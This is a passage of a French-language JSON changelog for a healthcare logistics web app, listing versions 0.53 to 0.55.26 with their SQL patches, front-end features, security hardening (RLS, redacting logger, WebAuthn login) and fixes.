    "titre": "🔒 Maintenance sécurité + optimisations + dédup code : durcissement RLS, logger sécurisé, composant Modal partagé, cache SW borné, table audit",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.55.26 : security_invoker=true sur les 3 vues récentes (v_users_auth_methods, v_my_webauthn_credentials, v_user_complete) pour forcer le respect des RLS de l'appelant. Index manquants (idx_webauthn_user_active, idx_invitations_token_active, idx_audit_log_struct_user_date, idx_app_logs_user_date, idx_membres_matricule)" },
      { "code": "SQL", "txt": "REVOKE PUBLIC + GRANT explicit authenticated sur les RPCs sensibles (reset_user_password, get_invitation_full, revoke_webauthn_credential, update_webauthn_last_used). Table security_audit_log + RPC log_security_event + trigger audit changements de rôle" },
      { "code": "FE", "txt": "Nouveau lib/logger.js : remplace console.log/warn/info par un logger qui REDACTE automatiquement les valeurs sensibles (password, token, refresh_token, credential_id, etc.) et qui se TAIT en production (sauf si flag debug activé via __avehoEnableDebug() dans la console)" },
      { "code": "FE", "txt": "Nouveau lib/constants.js : centralise les couleurs (COLOR.ok/ko/warn/...), gradients (GRADIENT.primary/danger/...) et icônes (ICON.fingerprint/face/...). Helpers colorForState() et labelForState() pour réduire le code dupliqué" },
      { "code": "FE", "txt": "Nouveau app/components/Modal.js : composant partagé qui encapsule le pattern modal-bg+modal+modal-head+modal-body+modal-foot. Supporte variant='centered' ou 'bottom-sheet' (mobile). Escape pour fermer, backdrop click, animation, header coloré gradient" },
      { "code": "FE", "txt": "Service Worker : limite MAX_DATA_CACHE_ENTRIES=100 (Supabase REST/RPC) et MAX_PAGE_CACHE_ENTRIES=30 (HTML). Helper trimCache LRU appelé après chaque put pour éviter la croissance illimitée du cache" },
      { "code": "FIX", "txt": "lib/webauthn.js, app/BiometricSection.js, app/BiometricOptInModal.js, app/StatusIcons.js : remplacement automatique de console.warn par logger.warn pour neutralisation en production" },
      { "code": "AI", "txt": "+19 tests Vitest sur le logger (redaction, profondeur max, troncature longue), constants (couleurs, gradients, helpers) et logique SW trim. Total 1106 tests verts (vs 1087)" }
    ],
    "themes": ["rls_securite", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.26.html",
    "sqlFile": "aveho-PATCH-vers-0.55.26.sql"
  },
  {
    "v": "0.55.25",
    "kind": "version",
    "titre": "Invitation enrichie : rattachement multi-établissements + lock + RH · Fiche utilisateur étendue (matricule, contact urgence, spécialité…) · Réinitialiser mot de passe (admin)",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.55.25 : invitations.etablissement_ids (uuid[]) + lock_assignment + matricule + date_arrivee + notes_admin. membres_structure étendu : matricule, date_naissance, contact_urgence_{nom,tel}, adresse, specialite, diplome, date_fin_contrat, locked_fields" },
      { "code": "SQL", "txt": "Vue v_user_complete combine membres_structure + bio_devices_count + has_empreinte/face pour faciliter les requêtes admin. RPC reset_user_password (admin only) journalise une demande de réinit. RPC get_invitation_full retourne tous les champs incluant etablissement_ids et lock_assignment" },
      { "code": "FE", "txt": "Modale 'Inviter un utilisateur' : nouveau bloc 'Rattachement aux établissements' avec sélection multi-pills (clic pour ajouter/retirer). Checkbox 'Verrouiller le rattachement' (cochée par défaut)" },
      { "code": "FE", "txt": "Modale invitation : nouveau bloc 'Informations RH' avec matricule, date d'arrivée et notes admin (visible uniquement par les admins)" },
      { "code": "FE", "txt": "Page /inscription/[token] : affichage des établissements rattachés avec badge VERROUILLÉ si lock_assignment=true. Matricule et date d'arrivée affichés en lecture seule s'ils ont été pré-remplis par l'admin" },
      { "code": "FE", "txt": "Fiche utilisateur (modale info) : nouveau bloc dépliable 'Informations RH étendues' avec matricule, date de naissance, spécialité, diplôme, adresse, contact d'urgence (nom + tél), date de fin de contrat" },
      { "code": "FE", "txt": "Fiche utilisateur : nouveau bloc dépliable 'Actions administrateur' avec bouton rouge 'Réinitialiser mot de passe' (déclenche la RPC + log applicatif) et bouton bleu 'Envoyer un email' (mailto:)" },
      { "code": "•", "txt": "Compatibilité douce : si le SQL n'a pas encore été passé, la sauvegarde fiche user retombe automatiquement sur les colonnes de base sans erreur" }
    ],
    "themes": ["users", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.25.html",
    "sqlFile": "aveho-PATCH-vers-0.55.25.sql"
  },
  {
    "v": "0.55.24",
    "kind": "version",
    "titre": "Smoke tests sur TOUTES les versions du changelog (fallback générique) + bouton 'Tester toutes les versions' avec rapport global",
    "chantiers": [
      { "code": "AI", "txt": "Système de smoke tests étendu : les versions sans tests dédiés bénéficient maintenant d'un fallback générique qui vérifie la présence de l'entrée dans versions-data, l'accessibilité de la note HTML et du fichier SQL (si applicable), et la description des chantiers" },
      { "code": "FE", "txt": "Bouton 'Tester' maintenant visible sur TOUTES les versions du changelog (vert si tests dédiés, gris si fallback générique) — chaque carte de version a son bouton" },
      { "code": "FE", "txt": "Nouveau bouton 'Tester toutes les versions' en haut de la page changelog : lance séquentiellement les tests de toutes les versions (73+) et affiche un rapport global avec progress bar" },
      { "code": "UX", "txt": "Modale rapport global : header gradient avec compteur dynamique X/Y versions testées, totaux OK/échec, version en cours d'exécution, progress bar live" },
      { "code": "UX", "txt": "Affichage des résultats : liste compacte des versions avec badge OK/échec, détails dépliables (<details>) pour les versions en échec montrant le nom du test fail + message + erreur éventuelle" }
    ],
    "themes": ["ux", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.24.html"
  },
  {
    "v": "0.55.23",
    "kind": "hotfix",
    "titre": "Badge version vraiment centré avec le logo · Feedback détaillé sur activation notifs/géoloc (succès, bloqué par browser, refusé) + notif de test au succès",
    "chantiers": [
      { "code": "FIX", "txt": "Badge v0.55.x : fix centrage final. Le logo 'aveho' avait une line-height héritée (1.5) qui décalait son baseline par rapport au badge. Solution : .logo en display:inline-flex + align-items:center + line-height:1 + height:24px. Badge mis à la même height:24px pour alignement strict" },
      { "code": "UX", "txt": "Quand l'user clique 'Autoriser' sur Notifications dans le popover/modale StatusIcons : feedback inline coloré selon le résultat — vert + notif de test (granted) / rouge avec instructions cadenas (denied) / orange avec instructions cloche (default, ex. Edge Quiet)" },
      { "code": "UX", "txt": "Idem pour Géolocalisation : feedback vert (success) ou rouge avec instructions selon le code d'erreur (1 = refusé, autres = erreur technique)" },
      { "code": "FE", "txt": "Notification de test envoyée automatiquement au moment de l'autorisation pour confirmer visuellement à l'user que c'est bien actif" }
    ],
    "themes": ["fixes", "ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.23.html"
  },
  {
    "v": "0.55.22",
    "kind": "hotfix",
    "titre": "Privacy : getDeviceName plus neutre · /utilisateurs : icônes bio toujours visibles avec couleur · smoke tests pour toutes les versions 0.55.18-22",
    "chantiers": [
      { "code": "FIX", "txt": "getDeviceName() : remplace les noms bruts 'Windows' / 'Mac' / 'iPhone' / modèle Android par des noms plus naturels et privacy-friendly ('Mon ordinateur (Windows)', 'Mon Mac', 'Mon iPhone', 'Mon téléphone Android' — sans modèle exact)" },
      { "code": "FE", "txt": "Page /utilisateurs : les 2 icônes biométriques (empreinte + face) sont maintenant TOUJOURS affichées à côté du nom de chaque user. Vert si méthode activée, gris si pas — comme ça on voit clairement l'état pour chaque user" },
      { "code": "AI", "txt": "Smoke tests ajoutés pour les versions 0.55.18, 19, 20, 21 et 22. La page changelog a maintenant 11 versions testables in-browser (de 0.55.12 à 0.55.22)" }
    ],
    "themes": ["ux", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.22.html"
  },
  {
    "v": "0.55.21",
    "kind": "hotfix",
    "titre": "Mobile : icônes de statut regroupées dans 1 bouton + modale plein écran · fix click action 'Gérer' · fix 503 transient",
    "chantiers": [
      { "code": "FE", "txt": "StatusIcons mode mobile (≤768px) : 1 seul bouton bouclier dans la TopBar à côté du panier, avec petite pastille de couleur (rouge si refusé, ambre si non config, vert si tout OK). Au clic, modale plein écran type bottom-sheet avec les 7 features détaillées" },
      { "code": "UX", "txt": "Modale mobile : header gradient, liste scrollable des features avec icône + nom + badge ACTIF/REFUSÉ/INACTIF + description + bouton 'Autoriser' ou 'Gérer dans Profil' pour chaque" },
      { "code": "FIX", "txt": "Boutons d'action des popovers : ajout de e.stopPropagation() pour éviter que le clic ne ferme accidentellement le popover avant que la redirection ne s'exécute. 'Gérer' ferme proprement la modale + setTimeout 50ms + router.push('/profil')" },
      { "code": "FIX", "txt": "SW networkFirst : retry 1× avec délai 100ms en cas d'échec network transient (cause potentielle du 503 sur /profil). Fallback HTML lisible avec bouton 'Réessayer' si /offline.html pas en cache" }
    ],
    "themes": ["ux", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.21.html"
  },
  {
    "v": "0.55.20",
    "kind": "hotfix",
    "titre": "TopBar : badge version centré et visible sur mobile · Profil : sections empreinte et facial séparées · réduction warning PWA + forced reflow",
    "chantiers": [
      { "code": "FIX", "txt": "Badge version (v0.55.x) dans la TopBar : centré verticalement (display:inline-flex + align-items:center + line-height:1 + height:22px), maintenant aussi visible sur mobile (était caché en display:none ≤900px)" },
      { "code": "FE", "txt": "Page Profil : section unique 'Connexion par empreinte' séparée en 2 sections distinctes — 'Connexion par empreinte digitale' (bleu) et 'Connexion par détection faciale' (violet). Chacune avec son icône, sa liste d'appareils filtrée par méthode" },
      { "code": "FIX", "txt": "BiometricSection accepte prop methodFilter pour n'afficher qu'une méthode (empreinte ou face). Liste credentials filtrée en conséquence" },
      { "code": "FIX", "txt": "Warning 'Banner not shown: beforeinstallprompt' : preventDefault appelé uniquement si l'install banner n'a pas été dismissed forever, sinon laisse Chrome gérer nativement" },
      { "code": "FIX", "txt": "Forced reflow 106ms : remplacé setTimeout(50) par requestAnimationFrame x2 dans le scroll auto vers le match courant (modale highlight)" }
    ],
    "themes": ["fixes", "ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.20.html"
  },
  {
    "v": "0.55.19",
    "kind": "version",
    "titre": "Icônes de statut dans la TopBar : réseau, notifs, géoloc, PWA, SW, empreinte, face — feux vert/rouge + popover détails",
    "chantiers": [
      { "code": "FE", "txt": "Nouveau composant StatusIcons monté dans la TopBar (à gauche du menu user) : 7 icônes de statut compactes avec petite pastille colorée en bas à droite" },
      { "code": "UX", "txt": "Code couleur : vert (#5aa05a) = activé/OK/autorisé, rouge (#c0392b) = refusé/bloqué, gris (#8a98a8) = non configuré ou indéterminé" },
      { "code": "UX", "txt": "Au clic sur une icône → popover de 280px avec header coloré, état (Activé / Refusé / Non configuré), description, et bouton d'action contextuel (Autoriser / Gérer)" },
      { "code": "FE", "txt": "Features tracées : Réseau (online/offline live via events), Notifications (Notification.permission), Géolocalisation (Permissions API), PWA installée (display-mode standalone + navigator.standalone iOS), Service Worker actif, Empreinte digitale activée, Détection faciale activée" },
      { "code": "UX", "txt": "Mobile-responsive : sur écran ≤520px, on cache les icônes secondaires (uniquement réseau + notif + géoloc + pwa visibles)" },
      { "code": "•", "txt": "Bouton 'Autoriser' déclenche directement Notification.requestPermission() ou geolocation.getCurrentPosition() ; 'Gérer' pour la bio redirige vers /profil" }
    ],
    "themes": ["ux", "pwa_offline"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.19.html"
  },
  {
    "v": "0.55.18",
    "kind": "hotfix",
    "titre": "Fix bug 'kind is not defined' sur changelog + fix SQL view 0.55.17 + bouton 'Tester' par version + 126 tests ajoutés (944 → 1070)",
    "chantiers": [
      { "code": "FIX", "txt": "Bug 'kind is not defined' au clic sur titre/évolution dans changelog : remplacé par v.kind correctement scopé dans la map" },
      { "code": "FIX", "txt": "SQL patch 0.55.17 : DROP VIEW v_my_webauthn_credentials avant CREATE pour contourner l'erreur 42P16 (Postgres refuse changer l'ordre des colonnes d'une vue)" },
      { "code": "AI", "txt": "Nouveau bouton 'Tester' vert sur chaque carte de version qui a des smoke tests : exécution in-browser des checks fonctionnels (WebAuthn dispo, RPCs accessibles, password policy, fichiers SQL servables, etc.)" },
      { "code": "UX", "txt": "Modale résultats des tests : compteur OK/échec dans le header, liste des tests avec icône check/x, message + erreur, bouton Relancer" },
      { "code": "AI", "txt": "+126 tests Vitest : 5 nouveaux fichiers (v055-12 password policy, v055-13 webauthn, v055-14 ZIP/SW, v055-15 SQL modal, v055-16 highlight, v055-17 face+empreinte) totalisant 1070 tests verts" }
    ],
    "themes": ["fixes", "ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.18.html"
  },
  {
    "v": "0.55.17",
    "kind": "version",
    "titre": "Détection faciale en plus de l'empreinte : 2 méthodes biométriques séparées, modale opt-in refondue, icônes par user dans /utilisateurs",
    "chantiers": [
      { "code": "BIO", "txt": "Ajout de la détection faciale (Face ID iPhone/iPad, Hello caméra Windows) en plus de l'empreinte digitale. Même WebAuthn, séparation logique via colonne auth_method (empreinte|face)" },
      { "code": "UX", "txt": "Modale opt-in refondue avec 2 cards distinctes : Empreinte (bleu) et Détection faciale (violet). L'user peut activer une ou les deux. Badge RECOMMANDÉ sur la méthode probablement compatible avec son device." },
      { "code": "FE", "txt": "Page /login : 1 bouton dédié par méthode activée pour l'email saisi. Bouton 'Se connecter avec la détection faciale' (gradient violet) ou 'avec mon empreinte' (gradient bleu/teal)." },
      { "code": "USR", "txt": "Page /utilisateurs : icônes empreinte (bleu) et face-id (violet) à côté du nom de chaque user pour visualiser quelles méthodes sont configurées" },
      { "code": "FE", "txt": "Page /profil → 'Connexion biométrique' : 2 lignes séparées pour empreinte et face avec activation/désactivation indépendantes. Liste des appareils avec badge méthode + badge CET APPAREIL." },
      { "code": "SQL", "txt": "Patch 0.55.17 : colonne webauthn_credentials.auth_method + check constraint + index + vue v_users_auth_methods (has_empreinte/has_face/total_devices)" },
      { "code": "•", "txt": "Migration douce IndexedDB ancien format → nouveau format multi-méthodes (préserve les activations existantes)" }
    ],
    "themes": ["rls_securite", "ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.17.html",
    "sqlFile": "aveho-PATCH-vers-0.55.17.sql"
  },
  {
    "v": "0.55.16",
    "kind": "version",
    "titre": "Refonte preview note changelog : click au lieu de hover, modale plein écran avec highlight des passages correspondants à l'évolution cliquée",
    "chantiers": [
      { "code": "UX", "txt": "Suppression du hover preview qui était coupé sur mobile et flashait sur desktop. Remplacé par un clic sur le titre ou sur une évolution." },
      { "code": "AI", "txt": "Modale plein écran (max 960×92vh) qui affiche la note HTML scopée avec ses styles confinés au scope .cl-note-scope (pas de pollution CSS)" },
      { "code": "AI", "txt": "Highlight automatique des passages correspondant à l'évolution cliquée. Extraction des mots-clés du txt (4+ caractères, sans stopwords FR), injection de <mark class='cl-match'> dans le HTML scopé." },
      { "code": "UX", "txt": "Navigation entre les matches : boutons ⬆/⬇ + compteur 'X/Y' + scroll auto vers le match courant avec animation et bordure orange vif sur le match actif" },
      { "code": "UX", "txt": "Bandeau jaune indiquant le nombre de passages trouvés + l'évolution cherchée + les mots-clés extraits. Bandeau gris si aucun match." },
      { "code": "UX", "txt": "Raccourcis clavier dans la modale : Échap (ferme), F3 ou n (match suivant), Shift+F3 ou p (précédent)" },
      { "code": "UX", "txt": "Boutons header : compteur matches, Télécharger HTML, X fermer. Curseur 'pointer' + hover ambre sur les évolutions cliquables." }
    ],
    "themes": ["ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.16.html"
  },
  {
    "v": "0.55.15",
    "kind": "version",
    "titre": "Bouton 'Requête SQL' sur chaque version du changelog : popup avec contenu, copier, télécharger",
    "chantiers": [
      { "code": "AI", "txt": "Sur chaque carte de version du changelog, nouveau bouton 'SQL' (navy + teal) à côté du bouton 'HTML'. Visible uniquement sur les versions qui ont un patch SQL associé." },
      { "code": "UX", "txt": "Popup d'affichage du SQL : header gradient avec nom du fichier, instructions Supabase, contenu syntax-highlighted sur fond navy, footer avec nb lignes + taille." },
      { "code": "UX", "txt": "3 actions dans la popup : bouton 'Copier' (clipboard, feedback vert 'Copié !'), bouton 'Télécharger' (.sql direct), bouton 'X' fermer + Escape" },
      { "code": "AI", "txt": "36 fichiers SQL copiés dans public/changelog-sql/ (de 0.15 à 0.55.13). Cache côté client après 1er chargement." },
      { "code": "•", "txt": "Champ 'sqlFile' ajouté dans versions-data.js sur les 36 versions concernées" }
    ],
    "themes": ["ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.15.html"
  },
  {
    "v": "0.55.14",
    "kind": "hotfix",
    "titre": "Fix 503 sur tooltip hover changelog + bouton 'Télécharger toutes les notes' en ZIP",
    "chantiers": [
      { "code": "FIX", "txt": "Service Worker : route /changelog-notes/* en cacheFirst (au lieu de networkFirst qui renvoyait 503 quand offline ou SW intercepte mal). Cache les notes au 1er hover, instant ensuite." },
      { "code": "FIX", "txt": "fetchNoteHtml côté changelog : retry sans force-cache si 1er fetch échoue, fallback élégant '⏳ Aperçu indisponible' au lieu d'erreur rouge." },
      { "code": "AI", "txt": "Bouton 'Télécharger toutes les notes' sur /changelog : zip contenant tous les .html + un INDEX.html cliquable. Utilise JSZip via dynamic import (~100KB économisés à l'init)." },
      { "code": "UX", "txt": "Indicateur de progression pendant la création du zip (1/22, 2/22... puis Compression... puis ✓ X notes)" }
    ],
    "themes": ["fixes", "ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.14.html"
  },
  {
    "v": "0.55.13",
    "kind": "version",
    "titre": "Refonte gestion utilisateurs (partie B) : connexion par empreinte digitale (WebAuthn) sur mobile",
    "chantiers": [
      { "code": "BIO", "txt": "Connexion par empreinte digitale / Touch ID / Face ID / Windows Hello sur mobile : table webauthn_credentials + RPC dédiées" },
      { "code": "UX", "txt": "Modale post-login automatique sur mobile : 'Activer la connexion par empreinte ?' avec personnalisation du nom de l'appareil" },
      { "code": "FE", "txt": "Bouton 'Se connecter avec mon empreinte' sur /login : visible si WebAuthn dispo + credential local pour l'email saisi" },
      { "code": "FE", "txt": "Nouvelle section /profil → 'Connexion par empreinte' : liste des appareils enregistrés + activation/révocation par device" },
      { "code": "SEC", "txt": "Architecture pragmatique : credential WebAuthn comme preuve de présence physique + refresh_token Supabase chiffré local (IndexedDB protégée par origin)" },
      { "code": "SQL", "txt": "Patch 0.55.13 : table webauthn_credentials + RLS (user own only) + 2 RPC (update_last_used, revoke) + vue v_my_webauthn_credentials" },
      { "code": "•", "txt": "Empreinte ne quitte jamais l'appareil — Aveho ne stocke que credential_id + device_name + user_agent côté serveur" }
    ],
    "themes": ["rls_securite", "ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.13.html",
    "sqlFile": "aveho-PATCH-vers-0.55.13.sql"
  },
  {
    "v": "0.55.12",
    "kind": "version",
    "titre": "Refonte gestion utilisateurs (partie A) : token invitation, page /inscription, policy mot de passe stricte, fix z-index carte",
    "chantiers": [
      { "code": "USR", "txt": "Page /utilisateurs : bouton 'Créer un utilisateur' avec modale enrichie (Identité, Contact, Rôle) — 3 sections, mobile-friendly" },
      { "code": "USR", "txt": "Champs étendus sur membres_structure : nom, prénom, mobile, fonction_detail, photo_url, preferences (jsonb)" },
      { "code": "FE", "txt": "Nouvelle page publique /inscription/[token] : formulaire pré-rempli, mot de passe avec policy stricte + jauge, redirection auto vers /accueil" },
      { "code": "EDGE", "txt": "Edge function invite-user réécrite : utilise le token custom (au lieu de admin.auth.inviteUserByEmail). Edge function welcome-user nouvelle (mail de bienvenue)" },
      { "code": "SEC", "txt": "Policy mot de passe stricte : min 12 caractères, 1 maj/min/chiffre/spécial, blacklist 'azerty123' & co. Composant PasswordInput réutilisable avec jauge couleur + bouton générer" },
      { "code": "SQL", "txt": "Patch 0.55.12 : vue v_users_complete + 3 RPC (validate_password_policy, get_invitation_preview, accept_invitation)" },
      { "code": "FIX", "txt": "Carte Leaflet : stacking context contraint (z-index:0 + isolation) pour ne plus passer au-dessus du menu drawer latéral" },
      { "code": "•", "txt": "Token invitation valide 7 jours, regénérable depuis la liste des invitations" }
    ],
    "themes": ["rls_securite", "ux", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.12.html",
    "sqlFile": "aveho-PATCH-vers-0.55.12.sql"
  },
  {
    "v": "0.55.11",
    "kind": "version",
    "titre": "Recherche globale ⌘K avec chips de filtre · Export Excel sur listes · Tooltip hover preview HTML sur changelog · Cleanup",
    "chantiers": [
      { "code": "AF", "txt": "Recherche globale ⌘K : chips visuels de filtre par catégorie (patients, matériels, DI, signalements, achats, transferts, maintenances, consents, fournisseurs)" },
      { "code": "AI", "txt": "Export Excel ajouté sur /etablissements, /patients, /matériels (lazy load xlsx via npm)" },
      { "code": "UI", "txt": "Tooltip hover sur changelog : passe la souris sur une évolution → preview du HTML de la note en popup flottant à côté du curseur" },
      { "code": "DOC", "txt": "Page changelog à jour avec 0.55.8, 0.55.9, 0.55.10, 0.55.11" },
      { "code": "FIX", "txt": "Migration xlsx CDN→npm (réflexe 19 : Edge/Brave bloquent jsdelivr)" },
      { "code": "OPS", "txt": "Cleanup dossier dupliqué aveho-ec-app/aveho-ec-app/ supprimé du repo" }
    ],
    "themes": ["ux", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.11.html"
  },
  {
    "v": "0.55.10",
    "kind": "hotfix",
    "titre": "Fix 502 carte FINESS — page_size cap 200 max tabular-api + garde-fou bbox > 5°lat ou 6°lng",
    "chantiers": [
      { "code": "FIX", "txt": "limit capé à 200 côté serveur ET client (tabular-api refuse >200, renvoyait 400 → mon proxy crashait en 502)" },
      { "code": "UX", "txt": "Garde-fou bbox trop large : si vue France entière → chip orange 'Zoome plus (zone trop large)' au lieu de fetch foireux" },
      { "code": "API", "txt": "Proxy FINESS renvoie 200 avec results:[] + error en metadata au lieu de 502 sur erreur tabular" }
    ],
    "themes": ["fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.10.html"
  },
  {
    "v": "0.55.9",
    "kind": "version",
    "titre": "Carte logistique — Overlay FINESS ressources santé (8 catégories) + fix display:none div",
    "chantiers": [
      { "code": "FE", "txt": "Sur /carte : panneau Ressources santé proches (FINESS) avec 8 catégories en chips multi-sélection" },
      { "code": "FE", "txt": "Catégories : Pharmacies (38k), Maisons de santé (1.1k), Centres de santé (3.4k), EHPAD, Hôpitaux/Cliniques, SSR/Psy, Handicap, Pharma & LPP" },
      { "code": "API", "txt": "Route /api/finess accepte ?bbox=lat1,lng1,lat2,lng2 (filtre tabular via geoloc_4326_lat/long __greater/__less)" },
      { "code": "UX", "txt": "Refresh auto au moveend (pan/zoom) debounced 800ms · marqueurs colorés par catégorie · popups détaillés" },
      { "code": "FIX", "txt": "Div carte plus en display:none (Leaflet ne pouvait pas mesurer clientWidth=0) — loader en position:absolute par-dessus" },
      { "code": "•", "txt": "Note : cabinets infirmiers/médecins libéraux individuels PAS dans FINESS (sont dans RPPS, autre API)" }
    ],
    "themes": ["geographique", "ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.9.html"
  },
  {
    "v": "0.55.8",
    "kind": "hotfix",
    "titre": "Fix critique carte vide en prod Vercel — race condition mapRef.current null",
    "chantiers": [
      { "code": "FIX", "txt": "Race condition mapRef.current null en prod : useEffect A posait flag leafletReady, useEffect B essayait L.map(mapRef.current) mais React n'avait pas encore commit le DOM" },
      { "code": "REFACTOR", "txt": "Fusion des 2 useEffects en un seul async avec attente patiente : while (!mapRef.current && tries < 50) await sleep(60)" },
      { "code": "RÉFLEXE 20", "txt": "Init lib qui dépend d'une DOM ref → toujours UN SEUL useEffect avec attente active de la ref. Pattern 'effect A pose un flag, effect B utilise la ref' cassé en prod." }
    ],
    "themes": ["fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.8.html"
  },
  {
    "v": "0.55.7",
    "kind": "hotfix",
    "titre": "Fix z-index dropdown FINESS/SIRENE · choix collectivité/partenaire dans Fiche étab · fix IndexedDB closing · changelog à jour",
    "chantiers": [
      { "code": "UI", "txt": "Z-index liste résultats FINESS/SIRENE 60→150 + parent Panel relative z=50" },
      { "code": "FE", "txt": "Sélecteur collectivité/partenaire dans Fiche Établissement" },
      { "code": "OFFLINE", "txt": "Fix InvalidStateError IDBDatabase closing avec withDb() helper retry" },
      { "code": "DOC", "txt": "Changelog à jour : 9 versions ajoutées (0.54 → 0.55.7)" }
    ],
    "themes": ["ux", "fixes", "offline_pwa"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.7.html"
  },
  {
    "v": "0.55.6",
    "kind": "version",
    "titre": "Groupement enrichi SIRENE + popup bâtiments par étab",
    "chantiers": [
      { "code": "RENAME", "txt": "'Collectivité' → 'Groupement' partout dans l'UI" },
      { "code": "SQL", "txt": "+18 champs SIRENE sur structures + batiments.etablissement_id" },
      { "code": "SIRENE", "txt": "Import SIRENE intégré dans Fiche Groupement (tous champs)" },
      { "code": "POPUP", "txt": "Cards d'étabs cliquables → modal arbo bâtiments/étages/services/chambres/lits" },
      { "code": "FE", "txt": "Tabs FINESS/SIRENE dans Fiche Établissement" }
    ],
    "themes": ["ux", "documentation", "stats_dashboard"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.6.html",
    "sqlFile": "aveho-PATCH-vers-0.55.6.sql"
  },
  {
    "v": "0.55.5",
    "kind": "hotfix",
    "titre": "Fix carte vide (Edge bloque CDN) · filtres médicaux FINESS/SIRENE · France+DOM-TOM",
    "chantiers": [
      { "code": "CDN", "txt": "Leaflet + Tabler icons bundlés via npm (Edge Tracking Prevention bloquait unpkg/jsdelivr)" },
      { "code": "FILT_F", "txt": "10 catégories FINESS filtrables (EHPAD, Hôpitaux, USLD, Handicap, SSR/Psy, HAD, Pharma, Formation, Enfance, Social)" },
      { "code": "FILT_S", "txt": "7 catégories SIRENE médicales (santé, pharma, matériel ortho, audio, ambulances, labos, fab pharma)" },
      { "code": "GEO", "txt": "Mention 'France + DOM-TOM' explicite" }
    ],
    "themes": ["fixes", "ux", "pwa"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.5.html"
  },
  {
    "v": "0.55.4",
    "kind": "version",
    "titre": "SIRENE + plugins ligne d'appel + choix appli GPS",
    "chantiers": [
      { "code": "SIRENE", "txt": "Route /api/sirene + composant SireneSearch (40M entreprises)" },
      { "code": "PLUG", "txt": "Plugins ligne d'appel sur tableau /etablissements (tel/mail/GPS/fiche)" },
      { "code": "GPS", "txt": "Modal choix appli GPS : Google Maps / Waze / Apple Plans / OSM" },
      { "code": "TABS", "txt": "Tabs FINESS/SIRENE dans modal d'import" }
    ],
    "themes": ["ux", "documentation"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.4.html"
  },
  {
    "v": "0.55.3",
    "kind": "hotfix",
    "titre": "Partenaires + Réorg menu Établissement + fix warning géoloc Chrome",
    "chantiers": [
      { "code": "PART", "txt": "Étabs partenaires (est_partenaire) : 3 onglets Tous/Mes/Partenaires" },
      { "code": "MENU", "txt": "Carte/Annuaire/Fiche étab déplacés dans section Établissement" },
      { "code": "MARK", "txt": "Marqueurs carte différenciés (bleu géré / teal partenaire)" },
      { "code": "GEO", "txt": "Fix 'Only request geolocation in response to a user gesture'" }
    ],
    "themes": ["ux", "fixes", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.3.html",
    "sqlFile": "aveho-PATCH-vers-0.55.3.sql"
  },
  {
    "v": "0.55.2",
    "kind": "hotfix",
    "titre": "Fix hydratation TopBar + page /etablissements (annuaire)",
    "chantiers": [
      { "code": "HYDR", "txt": "Fix 7 éléments TopBar mismatch hydratation (mounted state)" },
      { "code": "PAGE", "txt": "Page /etablissements créée (annuaire liste + KPI + filtres + modal import FINESS)" }
    ],
    "themes": ["fixes", "ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.2.html"
  },
  {
    "v": "0.55.0",
    "kind": "version",
    "titre": "FINESS national (340K étabs) + géolocalisation utilisateur sur carte",
    "chantiers": [
      { "code": "FINESS", "txt": "Route /api/finess + FinessSearch (Atlasanté data.gouv.fr, 340K étabs)" },
      { "code": "GEOLOC", "txt": "GeolocPrompt au premier login + marqueur user bleu pulsant sur carte" },
      { "code": "POS", "txt": "Bouton 'Ma position' avec flyTo centré" }
    ],
    "themes": ["ux", "documentation"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.0.html"
  },
  {
    "v": "0.54.0",
    "kind": "version",
    "titre": "Carte logistique Leaflet + Playwright + SafeWrite",
    "chantiers": [
      { "code": "AX", "txt": "Carte Leaflet /carte avec 12 camions demo animés + étabs géolocalisés" },
      { "code": "ADDR", "txt": "AddressAutocomplete via api-adresse.data.gouv.fr (BAN)" },
      { "code": "D", "txt": "Playwright (7 tests E2E sur 3 specs)" },
      { "code": "C", "txt": "SafeWrite tags-materiel + etiquettes" }
    ],
    "themes": ["ux", "documentation", "stats_dashboard"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.54.0.html",
    "sqlFile": "aveho-PATCH-vers-0.54.sql"
  },
  {
    "v": "0.53.0",
    "kind": "version",
    "titre": "Email valideurs · Comparaison périodes · Templates signalements · Mode compact · Mentions légales · Badge NEW",
    "chantiers": [
      {
        "code": "BC",
